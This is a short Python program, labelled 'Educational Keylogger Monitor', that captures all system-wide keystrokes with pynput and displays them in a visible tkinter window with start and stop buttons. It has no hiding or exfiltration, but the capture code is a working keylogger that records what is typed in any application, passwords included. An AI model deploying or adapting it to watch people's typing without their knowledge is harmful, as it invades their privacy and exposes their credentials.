import tkinter as tk
from tkinter import scrolledtext
from pynput.keyboard import Listener
import threading

# Global variable to control the listener
listener = None
running = False

def start_logging():
    global running, listener
    if not running:
        running = True
        status_label.config(text="Status: MONITORING...", fg="green")
        log_display.insert(tk.END, "\n[Started Logging]\n")
        
        # Run the listener in a separate thread so the GUI doesn't freeze
        t = threading.Thread(target=run_listener)
        t.start()

def stop_logging():
    global running, listener
    if running:
        running = False
        if listener:
            listener.stop()
        status_label.config(text="Status: STOPPED", fg="red")
        log_display.insert(tk.END, "\n[Stopped Logging]\n")

def run_listener():
    global listener
    with Listener(on_press=on_press) as l:
        listener = l
        l.join()

def on_press(key):
    # This runs every time a key is pressed
    k = str(key).replace("'", "")
    
    # Format keys for the GUI display
    if k == 'Key.space': k = ' '
    elif k == 'Key.enter': k = '\n'
    elif 'Key' in k: k = f'[{k}]'
    
    # Update the GUI text box (needs to be done safely)
    log_display.insert(tk.END, k)
    log_display.see(tk.END) # Auto-scroll to bottom

# --- GUI SETUP ---
root = tk.Tk()
root.title("Educational Keylogger Monitor")
root.geometry("400x400")

# Title
tk.Label(root, text="System Activity Monitor", font=("Arial", 16, "bold")).pack(pady=10)

# Status
status_label = tk.Label(root, text="Status: STOPPED", fg="red", font=("Arial", 12))
status_label.pack()

# Buttons Frame
btn_frame = tk.Frame(root)
btn_frame.pack(pady=10)

start_btn = tk.Button(btn_frame, text="Start Capture", bg="green", fg="white", command=start_logging)
start_btn.pack(side=tk.LEFT, padx=10)

stop_btn = tk.Button(btn_frame, text="Stop Capture", bg="red", fg="white", command=stop_logging)
stop_btn.pack(side=tk.LEFT, padx=10)

# Text Display Area
log_display = scrolledtext.ScrolledText(root, width=40, height=15)
log_display.pack(pady=10)

root.mainloop()